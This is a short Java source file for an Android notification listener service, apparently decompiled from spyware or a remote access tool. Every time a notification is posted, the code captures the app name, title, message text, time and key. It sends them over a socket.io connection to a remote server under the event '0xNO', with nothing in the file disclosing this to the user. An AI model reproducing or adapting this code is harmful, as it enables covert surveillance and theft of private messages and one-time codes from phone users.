package com.example.project20;

import android.content.Intent;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import androidx.core.app.NotificationCompat;
import org.json.JSONException;
import org.json.JSONObject;

public class NotificationListener extends NotificationListenerService {
    public IBinder onBind(Intent intent) {
        return super.onBind(intent);
    }

    public void onNotificationPosted(StatusBarNotification statusBarNotification) {
        String str;
        try {
            String packageName = statusBarNotification.getPackageName();
            String string = statusBarNotification.getNotification().extras.getString(NotificationCompat.EXTRA_TITLE);
            CharSequence charSequence = statusBarNotification.getNotification().extras.getCharSequence(NotificationCompat.EXTRA_TEXT);
            if (charSequence != null) {
                str = charSequence.toString();
            } else {
                str = "";
            }
            long postTime = statusBarNotification.getPostTime();
            String key = statusBarNotification.getKey();
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("appName", packageName);
            jSONObject.put("title", string);
            jSONObject.put("content", "" + str);
            jSONObject.put("postTime", postTime);
            jSONObject.put("key", key);
            IOSocket.getInstance().getIoSocket().emit("0xNO", jSONObject);
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }
}
